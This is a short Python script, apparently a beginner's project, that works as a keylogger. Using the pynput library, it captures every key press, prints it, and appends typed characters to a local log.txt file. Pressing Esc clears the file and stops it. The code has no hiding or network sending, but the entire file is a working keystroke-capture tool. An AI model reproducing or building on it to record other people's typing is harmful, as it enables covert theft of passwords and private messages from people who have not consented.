import pynput
import os

from pynput.keyboard import Key, Listener

#function defines actions on the key press
def on_press(key):
    print(key)

    write_file(key)

    if key == Key.esc:
        clear_file()
        return False

#function writes each key to a file
def write_file(key):
    #gives the path of the directory this program is in
    pth = os.path.dirname(os.path.realpath(__file__))
    
    #specify the name of the file to write to
    file_name = "log.txt"

    #combines the previous two varibales to get the full path of the log.txt file
    address = os.path.join(pth,file_name)

    #open file in append mode
    with open(address, "a") as f:

        #replace single quotes with nothing
        k = str(key).replace("'","")

        #Key.Space will now be logged as a space
        if k == "Key.space":
            f.write(' ')

        #Key.backspace will now be logged as an asterisk (*)
        if k == "Key.backspace":
            f.write('*')

        #Key.enter will now be logged as a space
        if k == "Key.enter":
            f.write(' ')

        #will exclude all other "non-standard" keys that begin with "Key"
        #and write only the "normal", alpahbetical keys
        elif k.find("Key") == -1:
            f.write(k)

#function clears the log.txt file to prep it for its next use
def clear_file():
    #exact same method of obtaining log.txt file path as write_file()
    pth = os.path.dirname(os.path.realpath(__file__))
    file_name = "log.txt"
    address = os.path.join(pth,file_name)

    #clears the log file
    with open(address, "r+") as f:
        f.truncate(0)
        f.seek(0)

    
with Listener(on_press=on_press) as listener:
    listener.join()
